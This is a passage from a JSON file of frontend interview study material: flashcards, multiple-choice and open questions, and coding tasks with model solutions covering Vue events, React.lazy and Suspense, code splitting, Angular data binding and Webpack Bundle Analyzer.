          "type": "flashcard",
          "question": "What is the shorthand syntax for the `v-on` directive when handling events in Vue templates (e.g., for a click event)?",
          "answer": "The shorthand is `@`. For a click event, you would use `@click=\"methodName\"`.",
          "options": [],
          "analysisPoints": [
            "Tests knowledge of Vue's template syntax.",
            "Focuses on common directives and their shorthands."
          ],
          "keyConcepts": [
            "Vue Events",
            "v-on",
            "Directives",
            "Template Syntax"
          ],
          "evaluationCriteria": [
            "Correctly identifies the `@` shorthand.",
            "Provides a valid example of its usage."
          ],
          "example": null,
          "tags": [
            "Vue.js",
            "Events",
            "Flashcard"
          ],
          "prerequisites": [
            "Vue templates"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_vue_code_1",
          "topic": "Vue Reactive Data",
          "level": "medium",
          "type": "code",
          "question": "Create a Vue component that displays a message and has a button to toggle its visibility. The message should initially be visible.",
          "answer": "<template>\n  <div>\n    <p v-if=\"isVisible\">Hello Vue!</p>\n    <button @click=\"toggleVisibility\">Toggle Message</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      isVisible: true\n    };\n  },\n  methods: {\n    toggleVisibility() {\n      this.isVisible = !this.isVisible;\n    }\n  }\n};\n</script>",
          "options": [],
          "analysisPoints": [
            "Tests ability to define reactive data (`isVisible`).",
            "Evaluates implementation of a method to change data (`toggleVisibility`).",
            "Requires use of a conditional rendering directive (`v-if`).",
            "Requires correct event binding (`@click`)."
          ],
          "keyConcepts": [
            "Vue Data",
            "Vue Methods",
            "Reactivity",
            "Conditional Rendering",
            "v-if",
            "Event Handling"
          ],
          "evaluationCriteria": [
            "Correct setup of `data` property.",
            "Proper implementation of `toggleVisibility` method.",
            "Effective use of `v-if` for conditional rendering.",
            "Correct event binding for the button."
          ],
          "example": null,
          "tags": [
            "Vue.js",
            "Components",
            "Coding Challenge",
            "Reactivity"
          ],
          "prerequisites": [
            "Vue Component Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_codesplitting_open_1",
          "topic": "Benefits of Code Splitting",
          "level": "medium",
          "type": "open",
          "question": "List and explain at least three significant benefits of implementing code splitting in a large-scale frontend application.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**Improved Initial Load Time**: By loading only the essential code for the current view, the initial bundle size is reduced, leading to faster page load and Time To Interactive (TTI).",
            "**Reduced Bandwidth Usage**: Less data is transferred over the network, which benefits users with limited data plans or slow internet connections.",
            "**Optimized Caching**: Smaller, independent chunks can be cached separately. If a change occurs in one part of the application, only the affected chunk needs to be re-downloaded, rather than the entire large bundle.",
            "**Better Resource Utilization**: Allows the browser to parse and execute smaller JavaScript files more efficiently, preventing performance bottlenecks associated with very large scripts.",
            "**Better User Experience**: Faster loads and more responsive interactions lead to a better overall user experience, reducing abandonment rates."
          ],
          "keyConcepts": [
            "Code Splitting",
            "Performance Optimization",
            "Bundle Size",
            "Load Time",
            "Caching",
            "Bandwidth"
          ],
          "evaluationCriteria": [
            "Identifies at least three distinct benefits.",
            "Provides clear and concise explanations for each benefit.",
            "Demonstrates understanding of the practical implications of code splitting."
          ],
          "example": null,
          "tags": [
            "Code Splitting",
            "Performance",
            "Optimization",
            "Open-Ended"
          ],
          "prerequisites": [
            "Web Development Fundamentals"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_codesplitting_mcq_1",
          "topic": "Code Splitting Implementation",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following JavaScript features is commonly used by modern bundlers (like Webpack) to enable code splitting?",
          "answer": "Dynamic `import()`",
          "options": [
            "`require()` statements",
            "Static `import` statements",
            "Dynamic `import()`",
            "`<script defer>` tags"
          ],
          "analysisPoints": [
            "Tests knowledge of the underlying mechanism for code splitting.",
            "Distinguishes between static and dynamic module loading.",
            "Connects a JavaScript feature to a build tool capability."
          ],
          "keyConcepts": [
            "Code Splitting",
            "Dynamic Import",
            "Webpack",
            "Modules"
          ],
          "evaluationCriteria": [
            "Correctly identifies `import()` as the key feature.",
            "Understands the distinction from static imports."
          ],
          "example": "The correct answer is **Dynamic `import()`**. While static `import` statements declare dependencies upfront, dynamic `import()` (a standard JavaScript feature) allows modules to be loaded asynchronously, on demand. Bundlers leverage this syntax to create separate JavaScript chunks for the dynamically imported modules.",
          "tags": [
            "Code Splitting",
            "JavaScript",
            "Modules",
            "MCQ"
          ],
          "prerequisites": [
            "JavaScript Modules"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_codesplitting_flashcard_1",
          "topic": "Code Splitting Core Idea",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the core idea behind 'code splitting' in web development?",
          "answer": "The core idea is to break a large JavaScript bundle into smaller, independently loadable chunks, allowing parts of the application to be loaded on demand instead of all at once.",
          "options": [],
          "analysisPoints": [
            "Focuses on the fundamental concept.",
            "Highlights the 'on-demand' aspect."
          ],
          "keyConcepts": [
            "Code Splitting",
            "Bundling",
            "Performance"
          ],
          "evaluationCriteria": [
            "Accurate and concise definition.",
            "Captures the essence of the technique."
          ],
          "example": null,
          "tags": [
            "Code Splitting",
            "Performance",
            "Flashcard"
          ],
          "prerequisites": [
            "Web basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_lazy_mcq_1",
          "topic": "React.lazy and Suspense",
          "level": "medium",
          "type": "mcq",
          "question": "Which statement best describes the relationship between `React.lazy` and `Suspense` when implementing code splitting in React?",
          "answer": "`React.lazy` defines a dynamically loaded component, while `Suspense` provides a fallback UI to display until that component's code is loaded.",
          "options": [
            "`React.lazy` is used for server-side rendering, and `Suspense` manages data fetching.",
            "`React.lazy` is an alternative to `useState`, and `Suspense` handles component lifecycle.",
            "`React.lazy` defines a dynamically loaded component, while `Suspense` provides a fallback UI to display until that component's code is loaded.",
            "`Suspense` is a higher-order component that wraps `React.lazy` for error handling."
          ],
          "analysisPoints": [
            "Tests understanding of the specific roles of `React.lazy` and `Suspense`.",
            "Distinguishes their functions in the context of code splitting.",
            "Discounts common misconceptions about their usage."
          ],
          "keyConcepts": [
            "React.lazy",
            "Suspense",
            "Code Splitting",
            "Dynamic Import",
            "Fallback UI"
          ],
          "evaluationCriteria": [
            "Accurate description of both `React.lazy` and `Suspense` roles.",
            "Correctly identifies their complementary nature for code splitting."
          ],
          "example": "The correct answer is **`React.lazy` defines a dynamically loaded component, while `Suspense` provides a fallback UI to display until that component's code is loaded.** `React.lazy` marks a component for dynamic loading via dynamic `import()`. `Suspense` is then needed to wrap the `lazy`-loaded component and define what React should render (the `fallback`) while the component's chunk is being fetched.",
          "tags": [
            "React",
            "Code Splitting",
            "React.lazy",
            "Suspense",
            "MCQ"
          ],
          "prerequisites": [
            "React Components",
            "Code Splitting"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_lazy_open_1",
          "topic": "React.lazy SSR Limitations",
          "level": "hard",
          "type": "open",
          "question": "Discuss a significant limitation of using `React.lazy` and `Suspense` in applications that require Server-Side Rendering (SSR). How are these limitations typically addressed?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**Limitation**: `React.lazy` and `Suspense` are primarily designed for client-side rendering. During SSR, the server needs to render the complete HTML before sending it to the client. When a `lazy`-loaded component is encountered on the server, its code isn't immediately available, leading to a hydration mismatch or an incomplete initial render.",
            "The server doesn't know what components need to be loaded asynchronously on the client, and `Suspense`'s `fallback` mechanism is not suitable for server-side rendering the final content.",
            "**Addressing Limitations**: This is typically addressed by using **SSR-aware code splitting solutions** like `Loadable Components` or React's experimental `Suspense for SSR` (which requires a compatible server-side rendering environment and React 18+ streaming APIs). These solutions collect information about dynamically loaded components during the server render pass and ensure their code is bundled and delivered correctly for the initial HTML, preventing hydration issues."
          ],
          "keyConcepts": [
            "React.lazy",
            "Suspense",
            "SSR",
            "Hydration",
            "Code Splitting",
            "Loadable Components"
          ],
          "evaluationCriteria": [
            "Clearly identifies the SSR limitation (hydration mismatch, incomplete render).",
            "Explains *why* it's a limitation (server doesn't know about dynamic imports).",
            "Proposes standard solutions (`Loadable Components`, React 18+ SSR features).",
            "Demonstrates advanced understanding of React rendering paradigms."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Splitting",
            "SSR",
            "Performance",
            "Advanced",
            "Open-Ended"
          ],
          "prerequisites": [
            "React.lazy/Suspense",
            "SSR concepts"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_lazy_flashcard_1",
          "topic": "React Suspense Fallback",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `fallback` prop in the React `Suspense` component?",
          "answer": "The `fallback` prop in `Suspense` is used to define the UI (e.g., a loading spinner, text) that will be displayed while the lazy-loaded component (or any suspended content) is loading.",
          "options": [],
          "analysisPoints": [
            "Tests knowledge of `Suspense` configuration.",
            "Focuses on its role in user experience during loading."
          ],
          "keyConcepts": [
            "React Suspense",
            "Fallback UI",
            "Loading State",
            "User Experience"
          ],
          "evaluationCriteria": [
            "Accurate description of the `fallback` prop's function.",
            "Provides examples of what it displays."
          ],
          "example": null,
          "tags": [
            "React",
            "Suspense",
            "Flashcard"
          ],
          "prerequisites": [
            "React.lazy"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_lazy_code_1",
          "topic": "Implement Route-Based Lazy Loading",
          "level": "medium",
          "type": "code",
          "question": "Using React.lazy and Suspense, implement a simple router that lazy-loads two different components (`HomePage` and `AboutPage`) based on a URL path. Display 'Loading...' while components are being fetched. Assume `HomePage.js` and `AboutPage.js` exist as default exports of simple functional components.\n\n```typescript\nimport React, { Suspense } from 'react';\n\n// Assume these components exist in separate files:\n// export default function HomePage() { return <h2>Home Page</h2>; }\n// export default function AboutPage() { return <h2>About Page</h2>; }\n\nconst App = () => {\n  // Simulate a simple routing mechanism\n  const path = window.location.pathname;\n\n  return (\n    <div>\n      <h1>My App</h1>\n      <nav>\n        <a href=\"/\">Home</a> | <a href=\"/about\">About</a>\n      </nav>\n      {/* Your implementation here */}\n    </div>\n  );\n};\n\nexport default App;\n```",
          "answer": "```typescript\nimport React, { Suspense, lazy } from 'react';\n\n// Assume these components exist in separate files:\n// export default function HomePage() { return <h2>Home Page</h2>; }\n// export default function AboutPage() { return <h2>About Page</h2>; }\n\nconst HomePage = lazy(() => import('./HomePage'));\nconst AboutPage = lazy(() => import('./AboutPage'));\n\nconst App = () => {\n  // Simulate a simple routing mechanism\n  const path = window.location.pathname;\n\n  let ComponentToRender = null;\n  if (path === '/') {\n    ComponentToRender = HomePage;\n  } else if (path === '/about') {\n    ComponentToRender = AboutPage;\n  }\n\n  return (\n    <div>\n      <h1>My App</h1>\n      <nav>\n        <a href=\"/\">Home</a> | <a href=\"/about\">About</a>\n      </nav>\n      <Suspense fallback={<div>Loading...</div>}>\n        {ComponentToRender ? <ComponentToRender /> : <div>Page not found</div>}\n      </Suspense>\n    </div>\n  );\n};\n\nexport default App;\n```",
          "options": [],
          "analysisPoints": [
            "Tests proper usage of `lazy` for dynamic imports.",
            "Evaluates the wrapping of `lazy` components with `Suspense`.",
            "Checks for correct `fallback` prop usage.",
            "Requires basic conditional rendering based on a 'route'."
          ],
          "keyConcepts": [
            "React.lazy",
            "Suspense",
            "Code Splitting",
            "Routing",
            "Dynamic Import",
            "Conditional Rendering"
          ],
          "evaluationCriteria": [
            "Correctly defines lazy-loaded components.",
            "Wraps the rendering logic in `Suspense`.",
            "Provides a valid `fallback` UI.",
            "Properly renders the selected component based on `path`."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Splitting",
            "Routing",
            "Coding Challenge",
            "Performance"
          ],
          "prerequisites": [
            "React.lazy/Suspense basics",
            "JavaScript conditional logic"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_analyzer_open_1",
          "topic": "Webpack Bundle Analyzer Use Cases",
          "level": "medium",
          "type": "open",
          "question": "You notice your application's initial load time is slow. How can the Webpack Bundle Analyzer assist you in diagnosing and addressing this performance issue?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**Visualization**: It provides an interactive treemap visualization of the bundle content, showing the size of each module and dependency.",
            "**Identifying Large Dependencies**: Allows quick identification of large third-party libraries or internal modules contributing significantly to the bundle size.",
            "**Detecting Duplicates**: Helps spot if multiple versions of the same library, or the same library multiple times, are included in the bundle.",
            "**Optimizing Imports (Tree Shaking)**: Reveals if entire libraries are being included when only a small portion is used (e.g., if tree shaking is not effective).",
            "**Validating Code Splitting**: Shows if code splitting is working as intended and if lazy-loaded chunks are indeed separate, or if critical paths are still too large.",
            "**Guidance for Optimization**: Provides data to make informed decisions on what to optimize: replacing large libraries, fine-tuning imports, or adjusting code splitting points."
          ],
          "keyConcepts": [
            "Webpack Bundle Analyzer",
            "Performance Optimization",
            "Bundle Size",
            "Tree Shaking",
            "Code Splitting",
            "Debugging"
          ],
          "evaluationCriteria": [
            "Clearly explains the tool's core function.",
            "Lists multiple actionable ways the tool helps.",
            "Connects the tool's features to specific performance bottlenecks.",
            "Demonstrates practical understanding of performance debugging."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Optimization",
            "Tooling",
            "Open-Ended"
          ],
          "prerequisites": [
            "Webpack basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_webpack_analyzer_mcq_1",
          "topic": "Webpack Bundle Analyzer Output",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary visual output of the Webpack Bundle Analyzer that helps identify large dependencies?",
          "answer": "An interactive treemap visualization",
          "options": [
            "A console log of file sizes",
            "A CSV file listing all modules",
            "An interactive treemap visualization",
            "A network waterfall chart"
          ],
          "analysisPoints": [
            "Tests knowledge of the specific visualization provided by the tool.",
            "Distinguishes it from other types of performance reports."
          ],
          "keyConcepts": [
            "Webpack Bundle Analyzer",
            "Visualization",
            "Bundle Size"
          ],
          "evaluationCriteria": [
            "Correctly identifies the treemap as the primary output.",
            "Demonstrates familiarity with the tool's interface."
          ],
          "example": "The correct answer is **An interactive treemap visualization**. The Webpack Bundle Analyzer generates an HTML file containing a treemap where the size of each colored rectangle represents the relative size of a module or dependency within your JavaScript bundles. This visual representation makes it easy to spot the largest contributors.",
          "tags": [
            "Webpack",
            "Performance",
            "Tooling",
            "MCQ"
          ],
          "prerequisites": [
            "Webpack basics"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_analyzer_flashcard_1",
          "topic": "Webpack Bundle Analyzer Purpose",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the main goal of using the Webpack Bundle Analyzer?",
          "answer": "To visualize the contents of Webpack output bundles and identify which modules are contributing most to the bundle size, helping optimize performance.",
          "options": [],
          "analysisPoints": [
            "Focuses on the tool's core utility.",
            "Highlights its connection to bundle size and optimization."
          ],
          "keyConcepts": [
            "Webpack Bundle Analyzer",
            "Bundle Size",
            "Optimization"
          ],
          "evaluationCriteria": [
            "Accurate and concise statement of purpose.",
            "Mentions both visualization and optimization."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Tooling",
            "Flashcard"
          ],
          "prerequisites": [
            "Webpack basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        }
      ],
      "tasks": [
        {
          "id": "task_react_simple_counter",
          "title": "React: Enhanced Counter with Reset and Max Limit",
          "description": "\nImplement a React functional component that functions as a counter. \n\n1.  **Display Count**: Show the current count.\n2.  **Increment Button**: A button to increment the count by 1.\n3.  **Decrement Button**: A button to decrement the count by 1. The count should not go below 0.\n4.  **Reset Button**: A button to reset the count to its initial value (0).\n5.  **Max Limit**: The count should not exceed 10. If an increment operation would push it above 10, it should remain at 10.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  // Implement increment, decrement, reset logic here\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      {/* Add your buttons here */}\n    </div>\n  );\n}\n\nexport default Counter;",
          "solutionCode": "import React, { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  const MAX_COUNT = 10;\n\n  const increment = () => {\n    setCount(prevCount => Math.min(prevCount + 1, MAX_COUNT));\n  };\n\n  const decrement = () => {\n    setCount(prevCount => Math.max(prevCount - 1, 0));\n  };\n\n  const reset = () => {\n    setCount(0);\n  };\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={increment} disabled={count === MAX_COUNT}>Increment</button>\n      <button onClick={decrement} disabled={count === 0}>Decrement</button>\n      <button onClick={reset}>Reset</button>\n    </div>\n  );\n}\n\nexport default Counter;",
          "testCases": [
            "Initial render: Count should be 0.",
            "Increment once: Count should be 1.",
            "Increment multiple times: Count should increase accordingly.",
            "Decrement once: Count should be -1 if no lower bound, 0 if lower bound is 0.",
            "Decrement below 0: Count should remain 0.",
            "Increment above 10: Count should remain 10.",
            "Click Reset: Count should return to 0 from any value."
          ],
          "hints": [
            "Use multiple `useState` calls if you need separate pieces of state, or derive state from a single `count` variable.",
            "For increment/decrement, consider using the functional update form of `setCount` (`setCount(prevCount => ...)`) to avoid stale closures, especially if updates are batched.",
            "Use conditional rendering or `disabled` prop on buttons based on current `count` value to enhance UX."
          ],
          "tags": [
            "React",
            "Hooks",
            "useState",
            "State Management",
            "Functional Components",
            "Frontend Interview"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "React useState",
            "JavaScript Math functions"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "React Event Handling",
            "Conditional Logic in JSX"
          ]
        },
        {
          "id": "task_angular_data_binding",
          "title": "Angular: Dynamic Text Display and Input Handling",
          "description": "\nCreate an Angular component that demonstrates various data binding techniques.\n\n1.  **Display Greeting**: Show a default greeting message (e.g., \"Hello, Angular!\") using interpolation.\n2.  **Input Field**: Add an `<input type=\"text\">` element.\n3.  **Two-way Binding**: Use two-way data binding (`ngModel`) to connect the input field's value to a component property (e.g., `userName`).\n4.  **Display User Name**: Update the greeting message to include the `userName` as the user types (e.g., \"Hello, [UserName]!\"). If the `userName` is empty, revert to the default greeting.\n5.  **Button Action**: Add a button that, when clicked, clears the `userName` and reverts the greeting to default.\n\n**Note**: You might need to import `FormsModule` in your `AppModule` to use `ngModel`.\n",
          "difficulty": "medium",
          "startingCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-greeting',\n  template: `\n    <div>\n      <!-- Your template code here -->\n    </div>\n  `,\n  styles: []\n})\nexport class GreetingComponent {\n  defaultGreeting = 'Hello, Angular!';\n  userName = ''; // This property should be bound to the input\n\n  // Implement methods here\n}\n",
          "solutionCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-greeting',\n  template: `\n    <div>\n      <h2>{{ displayGreeting() }}</h2>\n      <input type=\"text\" [(ngModel)]=\"userName\" placeholder=\"Enter your name\">\n      <button (click)=\"clearName()\">Clear Name</button>\n    </div>\n  `,\n  styles: []\n})\nexport class GreetingComponent {\n  defaultGreeting = 'Hello, Angular!';\n  userName = '';\n\n  displayGreeting(): string {\n    return this.userName ? `Hello, ${this.userName}!` : this.defaultGreeting;\n  }\n\n  clearName(): void {\n    this.userName = '';\n  }\n}\n",
          "testCases": [
            "Initial render: Greeting should be 'Hello, Angular!'. Input should be empty.",
            "Typing 'Alice' in input: Greeting should change to 'Hello, Alice!'.",
            "Clearing input: Greeting should revert to 'Hello, Angular!'.",
            "Clicking 'Clear Name' button after typing: Input should clear, greeting should revert to default."
          ],
          "hints": [
            "Remember to enable `FormsModule` in `AppModule` to use `[(ngModel)]`.",
            "You can use a getter method or a simple conditional (`this.userName ? ... : ...`) in the template for the dynamic greeting.",
            "Ensure `clearName()` method correctly resets the `userName` property."
          ],
          "tags": [
            "Angular",
            "Components",
            "Data Binding",
            "ngModel",
            "Frontend Interview"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Angular Component Basics",
            "TypeScript basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Angular Modules",
            "Event Binding",
            "Interpolation"
          ]
        },
        {
          "id": "task_vue_todo_list",
          "title": "Vue: Simple Todo List with Add and Remove Functionality",
          "description": "\nBuild a basic Todo List Vue component using the Options API.\n\n1.  **Display Todos**: Show a list of existing todo items. Each todo item should display its text and have a 'Remove' button next to it.\n2.  **Add Todo**: An input field and an 'Add Todo' button to add new items to the list.\n3.  **Remove Todo**: The 'Remove' button next to each todo item should delete that item from the list.\n4.  **Empty State**: If there are no todo items, display a message like \"No todos yet!\".\n\nInitial todos can be an empty array or a few sample items.\n",
          "difficulty": "medium",
          "startingCode": "<template>\n  <div>\n    <h2>My Todo List</h2>\n    <!-- Input and Add button here -->\n    \n    <!-- Todo list and No todos message here -->\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      newTodoText: '',\n      todos: [] // or [{ id: 1, text: 'Learn Vue' }] for initial data\n    };\n  },\n  methods: {\n    // Implement addTodo and removeTodo here\n  }\n};\n</script>",
          "solutionCode": "<template>\n  <div>\n    <h2>My Todo List</h2>\n    <input type=\"text\" v-model=\"newTodoText\" @keyup.enter=\"addTodo\" placeholder=\"Add a new todo\">\n    <button @click=\"addTodo\">Add Todo</button>\n\n    <p v-if=\"todos.length === 0\">No todos yet!</p>\n\n    <ul v-else>\n      <li v-for=\"todo in todos\" :key=\"todo.id\">\n        {{ todo.text }}\n        <button @click=\"removeTodo(todo.id)\">Remove</button>\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      newTodoText: '',\n      todos: []\n    };\n  },\n  methods: {\n    addTodo() {\n      if (this.newTodoText.trim() === '') return;\n      this.todos.push({\n        id: Date.now(), // Simple unique ID\n        text: this.newTodoText.trim()\n      });\n      this.newTodoText = ''; // Clear input\n    },\n    removeTodo(id) {\n      this.todos = this.todos.filter(todo => todo.id !== id);\n    }\n  }\n};\n</script>",
          "testCases": [
            "Initial render: 'No todos yet!' message should be visible.",
            "Add a todo: Type 'Buy milk', click 'Add'. List should show 'Buy milk'. Input should clear.",
            "Add another todo: Type 'Walk dog', click 'Add'. List should show both items.",
            "Remove a todo: Click 'Remove' next to 'Buy milk'. Only 'Walk dog' should remain.",
            "Remove last todo: Click 'Remove' for 'Walk dog'. 'No todos yet!' should reappear."
          ],
          "hints": [
            "Use `v-model` for two-way data binding on the input field.",
            "Use `v-for` to render the list of todos and ensure you provide a `:key` for list items.",
            "Implement `addTodo` to push new items to the `todos` array and `removeTodo` to filter items out.",
            "Consider using `v-if` and `v-else` for the 'No todos yet!' message.",
            "You can use `Date.now()` or a simple counter for unique IDs."
          ],
          "tags": [
            "Vue.js",
            "Components",
            "Data Reactivity",
            "v-model",
            "v-for",
            "Event Handling",
            "Frontend Interview"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Vue Component Basics",
            "JavaScript Array methods"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Vue Directives",
            "List Rendering",
            "Conditional Rendering"
          ]
        },
        {
          "id": "task_react_lazy_loading",
          "title": "React: Route-Based Lazy Loading with Authentication Guard",
          "description": "\nImplement a React application using `React.lazy` and `Suspense` for route-based code splitting. Additionally, add a simple authentication guard.\n\n1.  **Homepage (`/`)**: Always accessible, static content.\n2.  **Dashboard Page (`/dashboard`)**: Only accessible if `isAuthenticated` is true. If not authenticated, redirect to the login page (`/login`).\n3.  **Login Page (`/login`)**: Simple form with a button to toggle `isAuthenticated` state.\n4.  **Lazy Loading**: The `DashboardPage` and `LoginPage` should be lazy-loaded.\n5.  **Suspense Fallback**: Display a 'Loading...' message while lazy components are loading.\n\nAssume a global `isAuthenticated` state managed by `useState` in `App` for simplicity. Use `react-router-dom` for routing.\n",
          "difficulty": "hard",
          "startingCode": "import React, { useState, Suspense, lazy } from 'react';\nimport { BrowserRouter as Router, Route, Routes, Link, Navigate } from 'react-router-dom';\n\nconst HomePage = () => <h2>Welcome Home!</h2>;\n\n// Lazy load DashboardPage and LoginPage here\n\nconst App = () => {\n  const [isAuthenticated, setIsAuthenticated] = useState(false);\n\n  const handleLoginToggle = () => {\n    setIsAuthenticated(prev => !prev);\n  };\n\n  return (\n    <Router>\n      <nav>\n        <Link to=\"/\">Home</Link> |\n        <Link to=\"/dashboard\">Dashboard</Link> |\n        <Link to=\"/login\">Login</Link>\n        <button onClick={handleLoginToggle}>\n          {isAuthenticated ? 'Logout' : 'Login'}\n        </button>\n      </nav>\n      <hr />\n      <Suspense fallback={<div>Loading...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<HomePage />} />\n          {/* Implement protected route and login route here */}\n        </Routes>\n      </Suspense>\n    </Router>\n  );\n};\n\nexport default App;",
          "solutionCode": "import React, { useState, Suspense, lazy } from 'react';\nimport { BrowserRouter as Router, Route, Routes, Link, Navigate, Outlet } from 'react-router-dom';\n\nconst HomePage = () => <h2>Welcome Home!</h2>;\nconst DashboardPage = lazy(() => import('./DashboardPage')); // Assume DashboardPage.js exists\nconst LoginPage = lazy(() => import('./LoginPage')); // Assume LoginPage.js exists\n\n// Example content for DashboardPage.js\n// export default function DashboardPage() { return <h2>Dashboard Content</h2>; }\n\n// Example content for LoginPage.js\n// export default function LoginPage() { return <h2>Login Form</h2>; }\n\nconst ProtectedRoute = ({ isAuthenticated, redirectPath = '/login' }) => {\n  if (!isAuthenticated) {\n    return <Navigate to={redirectPath} replace />;\n  }\n  return <Outlet />;\n};\n\nconst App = () => {\n  const [isAuthenticated, setIsAuthenticated] = useState(false);\n\n  const handleLoginToggle = () => {\n    setIsAuthenticated(prev => !prev);\n  };\n\n  return (\n    <Router>\n      <nav>\n        <Link to=\"/\">Home</Link> |\n        <Link to=\"/dashboard\">Dashboard</Link> |\n        <Link to=\"/login\">Login</Link>\n        <button onClick={handleLoginToggle}>\n          {isAuthenticated ? 'Logout' : 'Login'}\n        </button>\n        <p>Status: {isAuthenticated ? 'Logged In' : 'Logged Out'}</p>\n      </nav>\n      <hr />\n      <Suspense fallback={<div>Loading...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<HomePage />} />\n          <Route path=\"/login\" element={<LoginPage />} />\n          \n          {/* Protected Route */}\n          <Route element={<ProtectedRoute isAuthenticated={isAuthenticated} />}>\n            <Route path=\"/dashboard\" element={<DashboardPage />} />\n          </Route>\n        </Routes>\n      </Suspense>\n    </Router>\n  );\n};\n\nexport default App;",
          "testCases": [
            "Initial Load (`/`): HomePage should be visible, Dashboard and Login components should not be loaded.",
            "Navigate to `/login`: LoginPage should load and display, isAuthenticated should be false.",
            "Click Login/Logout button: isAuthenticated state should toggle.",
            "Navigate to `/dashboard` (logged out): Should redirect to `/login`.",
            "Navigate to `/dashboard` (logged in): DashboardPage should lazy-load and display.",
            "Observe network requests: Verify that `DashboardPage` and `LoginPage` chunks are only loaded when navigated to (and not on initial app load)."
          ],
          "hints": [
            "Define `DashboardPage` and `LoginPage` using `React.lazy(() => import('./path/to/Component'))`.",
            "Wrap the `Routes` component with `Suspense` to provide a loading fallback.",
            "For the authentication guard, you can create a wrapper component (`ProtectedRoute`) that checks `isAuthenticated` and uses `Navigate` from `react-router-dom` to redirect.",
            "Make sure to set up your `package.json` to include `react-router-dom`."
          ],
          "tags": [
            "React",
            "Code Splitting",
            "React.lazy",
            "Suspense",
            "Routing",
            "Authentication",
            "Frontend Interview"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "React Hooks",
            "React Router",
            "Code Splitting Concepts"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "SPA Architecture",
            "Conditional Rendering",
            "Performance Optimization"
          ]
        },
        {
          "id": "task_performance_optimization_analysis",
          "title": "Performance: Analyze Bundle & Suggest Optimizations",
          "description": "\nGiven a scenario where a large React application has slow initial load times, your task is to outline a strategy for using `webpack-bundle-analyzer` and other techniques to identify and address the performance issues. You do not need to write code for the analysis tool itself, but explain how you would use its output.\n\n**Scenario**: A React single-page application built with Webpack contains many features and third-party libraries. Users report long loading screens when they first visit the site. You suspect the main JavaScript bundle is too large.\n\n**Your Task**: Describe a step-by-step process you would follow to diagnose and optimize the bundle size. Include:\n\n1.  **Tool Setup**: How would you enable/run `webpack-bundle-analyzer`?\n2.  **Analysis**: What specific information would you look for in the analyzer's report?\n3.  **Optimization Strategies**: Based on the insights, what actionable steps would you take to reduce the bundle size and improve load times? Provide at least three distinct strategies.\n4.  **Verification**: How would you confirm your optimizations were successful?\n",
          "difficulty": "hard",
          "startingCode": "/* No starting code needed, this is a conceptual task. */",
